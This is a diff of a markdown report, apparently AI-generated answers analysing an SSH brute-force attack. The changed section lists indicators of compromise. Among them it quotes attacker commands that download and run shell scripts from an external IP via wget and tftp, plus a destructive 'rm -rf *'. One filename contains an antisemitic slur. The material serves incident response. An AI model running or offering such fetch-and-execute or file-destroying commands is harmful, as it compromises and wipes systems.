@@ -612,54 +612,6 @@ A secure configuration such as requiring cryptographic keys for login, setting u
 ---
 
 
-## Prompt: What are the indicators of compromise (IOCs) for this attack?
-
-**Run ID:** `run_1Z9kEF9u0wBS8sxp5OGzrSPp`
-
-<details>
-<summary>
-<h3>Answer</h3>
-</summary>
-
-The indicators of compromise (IOCs) for this attack include:
-
-1. **Source IP of the Attacker**: `138.197.148.152` - This IP address was found to be the source of the malicious SSH login attempts. System logs showing repeated login attempts or traffic from this IP would be a clear sign of potential attack activities.
-
-2. **Brute-force Attempts**: Multiple login attempts using the username `root` and the password `12345678` may indicate brute-force attempts.
-
-3. **Successful Logins**: Successful login messages for the root user, especially from unfamiliar IPs, should be considered suspicious.
-
-4. **Execution of Certain Commands**: The execution of commands related to downloading and the running of malicious scripts are significant IOCs. These activities are red flags for post-exploitation activities:
-    - `wget http://213.255.246.81/fuckjewishpeople.sh`
-    - `chmod 777 fuckjewishpeople.sh`
-    - `sh fuckjewishpeople.sh`
-    - `tftp 213.255.246.81 -c get tftp1.sh`
-    - `chmod 777 tftp1.sh; sh tftp1.sh`
-    - `tftp -r tftp2.sh -g 213.255.246.81`
-    - `chmod 777 tftp2.sh; sh tftp2.sh`
-    - `rm -rf *`
-
-5. **SSH Logs**: System logs such as `/var/log/secure` or `/var/log/auth.log` will contain entries of login attempts. Successful or failed attempts from the above IP would be a sign of an attempted or successful attack.
-
-6. **Malicious Files**: The presence of any of these files on the server can serve as indicators of compromise:
-    - `fuckjewishpeople.sh`
-    - `tftp1.sh`
-    - `tftp2.sh`
-
-7. **Malware Hash**: The SHA-256 hash of the known malware associated with the attack - `aa043d92421ceff25207e931bde07b17494357cc8e1081a006179530b48af950`.
-
-8. **Network Connections**: Unexpected outbound network connections to the IP address `213.255.246.81`.
-
-9. **Malware Host IP**: The IP address `213.255.246.81` is hosting exploitative scripts. Traffic to this server could indicate malicious activity.
-
-10. **Data Deletion**: An unusual amount of files being removed or an increase in disk space free might indicate the destructive command `rm -rf *` has been run.
-
-These IOCs can provide leads during incident responses, be used for threat hunting purposes, or be used to develop IDS signatures.
-</details>
-
----
-
-
 ## Prompt: How can this attack be classified using the MITRE ATT&CK framework?
 
 **Run ID:** `run_Tfq5EQxJVasWdinO1nYLHodh`
@@ -780,6 +732,54 @@ Here are several measures that should be taken to protect a server from this kin
 10. **Backup Regularly and Keep Offline Copies**: Regular backups and offline storage can make data recovery much easier in the case of data loss.
 
 By applying these measures, you can significantly thwart and mitigate the risks of attacks like these.
+</details>
+
+---
+
+
+## Prompt: What are the indicators of compromise (IOCs) for this attack?
+
+**Run ID:** `run_1Z9kEF9u0wBS8sxp5OGzrSPp`
+
+<details>
+<summary>
+<h3>Answer</h3>
+</summary>
+
+The indicators of compromise (IOCs) for this attack include:
+
+1. **Source IP of the Attacker**: `138.197.148.152` - This IP address was found to be the source of the malicious SSH login attempts. System logs showing repeated login attempts or traffic from this IP would be a clear sign of potential attack activities.
+
+2. **Brute-force Attempts**: Multiple login attempts using the username `root` and the password `12345678` may indicate brute-force attempts.
+
+3. **Successful Logins**: Successful login messages for the root user, especially from unfamiliar IPs, should be considered suspicious.
+
+4. **Execution of Certain Commands**: The execution of commands related to downloading and the running of malicious scripts are significant IOCs. These activities are red flags for post-exploitation activities:
+    - `wget http://213.255.246.81/fuckjewishpeople.sh`
+    - `chmod 777 fuckjewishpeople.sh`
+    - `sh fuckjewishpeople.sh`
+    - `tftp 213.255.246.81 -c get tftp1.sh`
+    - `chmod 777 tftp1.sh; sh tftp1.sh`
+    - `tftp -r tftp2.sh -g 213.255.246.81`
+    - `chmod 777 tftp2.sh; sh tftp2.sh`
+    - `rm -rf *`
+
+5. **SSH Logs**: System logs such as `/var/log/secure` or `/var/log/auth.log` will contain entries of login attempts. Successful or failed attempts from the above IP would be a sign of an attempted or successful attack.
+
+6. **Malicious Files**: The presence of any of these files on the server can serve as indicators of compromise:
+    - `fuckjewishpeople.sh`
+    - `tftp1.sh`
+    - `tftp2.sh`
+
+7. **Malware Hash**: The SHA-256 hash of the known malware associated with the attack - `aa043d92421ceff25207e931bde07b17494357cc8e1081a006179530b48af950`.
+
+8. **Network Connections**: Unexpected outbound network connections to the IP address `213.255.246.81`.
+
+9. **Malware Host IP**: The IP address `213.255.246.81` is hosting exploitative scripts. Traffic to this server could indicate malicious activity.
+
+10. **Data Deletion**: An unusual amount of files being removed or an increase in disk space free might indicate the destructive command `rm -rf *` has been run.
+
+These IOCs can provide leads during incident responses, be used for threat hunting purposes, or be used to develop IDS signatures.
 </details>
 
 ---
